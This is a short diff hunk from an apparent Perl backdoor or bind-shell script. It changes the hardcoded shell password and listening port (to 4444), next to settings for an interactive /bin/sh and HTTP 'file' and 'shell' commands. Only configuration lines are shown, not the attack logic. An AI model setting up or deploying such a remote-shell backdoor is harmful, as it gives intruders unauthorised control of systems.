@@ -3,8 +3,8 @@
 use Socket;
 
 $SHELL="/bin/sh -i";
-$SHELLPASSWORD="mlcb0ard";
-$LISTENPORT="49155";
+$SHELLPASSWORD="youpass";
+$LISTENPORT="4444";
 $HTTPFILECMD="file";
 $HTTPSHELLCMD="shell";
 
